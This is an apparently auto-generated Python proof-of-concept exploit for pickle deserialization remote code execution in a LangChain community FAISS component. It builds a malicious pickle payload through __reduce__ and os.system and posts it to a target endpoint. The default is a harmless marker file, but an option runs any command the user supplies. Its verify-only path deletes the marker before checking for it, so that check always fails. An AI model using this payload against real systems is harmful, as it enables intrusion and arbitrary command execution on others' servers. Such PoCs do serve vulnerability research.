#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-017
# Sink: deserialize_from_bytes
# Auto-generated — run with: python3 rce_function_deserialize_bytes_directly_deserialize_from_bytes_5.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for pickle deserialization RCE in langchain-community-only.

Vulnerability: The function deserialize_from_bytes in FAISS vectorstore calls
pickle.loads() on attacker-controlled bytes without any validation, allowing
arbitrary code execution.

This PoC demonstrates the vulnerability by creating a malicious pickle payload
that creates a marker file /tmp/poc_success.txt to prove code execution.
"""

import pickle
import os
import sys
import base64
import requests
import argparse
import subprocess
from typing import Any, Dict

# =============================================================================
# Configuration - modify these as needed
# =============================================================================
TARGET_URL = "http://localhost:8000/api/v1/trigger"
MARKER_FILE = "/tmp/poc_success.txt"

# =============================================================================
# Malicious pickle payload generation
# =============================================================================

class RCE:
    """
    A class whose __reduce__ method returns a callable and arguments
    that will be executed during pickle deserialization.
    """
    def __reduce__(self) -> tuple:
        # Benign payload: create a marker file to prove code execution
        cmd = f"touch {MARKER_FILE}"
        return (os.system, (cmd,))


def create_malicious_payload() -> bytes:
    """
    Creates a pickle payload that executes a benign command when deserialized.
    
    Returns:
        bytes: Serialized malicious pickle payload
    """
    payload = pickle.dumps(RCE())
    return payload


def create_payload_with_command(command: str) -> bytes:
    """
    Creates a pickle payload that executes an arbitrary command.
    
    Args:
        command: Command to execute on the target system
        
    Returns:
        bytes: Serialized malicious pickle payload
    """
    class CustomRCE:
        def __reduce__(self) -> tuple:
            return (os.system, (command,))
    
    return pickle.dumps(CustomRCE())


# =============================================================================
# Exploit delivery
# =============================================================================

def send_exploit(target_url: str, payload: bytes) -> requests.Response:
    """
    Sends the malicious pickle payload to the vulnerable endpoint.
    
    The payload is base64-encoded to ensure safe transmission over HTTP.
    
    Args:
        target_url: URL of the vulnerable endpoint
        payload: Raw pickle bytes to send
        
    Returns:
        requests.Response: Server response
        
    Raises:
        requests.exceptions.RequestException: On connection/HTTP errors
    """
    # Encode payload as base64 for safe HTTP transmission
    encoded_payload = base64.b64encode(payload).decode('utf-8')
    
    # Prepare the request body - the vulnerable function expects bytes input
    # The exact parameter name depends on the endpoint implementation
    data = {
        "serialized": encoded_payload,
        "untrusted_user_input": encoded_payload  # Alternative parameter name
    }
    
    print(f"[*] Sending exploit to {target_url}")
    print(f"[*] Payload size: {len(payload)} bytes")
    print(f"[*] Encoded payload: {encoded_payload[:50]}...")
    
    response = requests.post(
        target_url,
        json=data,
        timeout=10,
        headers={"Content-Type": "application/json"}
    )
    
    return response


def verify_exploit_success() -> bool:
    """
    Checks if the marker file was created, indicating successful RCE.
    
    Returns:
        bool: True if marker file exists
    """
    return os.path.exists(MARKER_FILE)


def cleanup() -> None:
    """Removes the marker file if it exists."""
    if os.path.exists(MARKER_FILE):
        os.remove(MARKER_FILE)
        print("[*] Cleaned up marker file")


# =============================================================================
# Main exploit function
# =============================================================================

def main() -> None:
    """Main exploit execution flow."""
    parser = argparse.ArgumentParser(
        description="PoC for pickle deserialization RCE in langchain-community-only"
    )
    parser.add_argument(
        "-u", "--url",
        default=TARGET_URL,
        help=f"Target URL (default: {TARGET_URL})"
    )
    parser.add_argument(
        "-c", "--command",
        help="Custom command to execute (default: touch marker file)"
    )
    parser.add_argument(
        "--verify-only",
        action="store_true",
        help="Only verify if previous exploit succeeded"
    )
    
    args = parser.parse_args()
    
    # Clean up any previous marker file
    cleanup()
    
    if args.verify_only:
        if verify_exploit_success():
            print("[+] Exploit verified: marker file exists!")
            sys.exit(0)
        else:
            print("[-] No marker file found - exploit may have failed")
            sys.exit(1)
    
    # Create the malicious payload
    if args.command:
        print(f"[*] Creating payload with custom command: {args.command}")
        payload = create_payload_with_command(args.command)
    else:
        print(f"[*] Creating benign payload (touch {MARKER_FILE})")
        payload = create_malicious_payload()
    
    try:
        # Send the exploit
        response = send_exploit(args.url, payload)
        
        print(f"[*] Server response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:200]}")
        
        # Check if the exploit succeeded
        if verify_exploit_success():
            print(f"[+] SUCCESS! Marker file created at {MARKER_FILE}")
            print("[+] Remote code execution confirmed!")
            print(f"[+] Command executed: {'touch ' + MARKER_FILE if not args.command else args.command}")
        else:
            print("[-] Marker file not found - exploit may have failed")
            print("[*] Note: The endpoint might require different parameter names")
            print("[*] or the payload might need to be sent differently")
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection failed: {args.url}")
        print("[*] Make sure the target server is running")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        sys.exit(1)
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
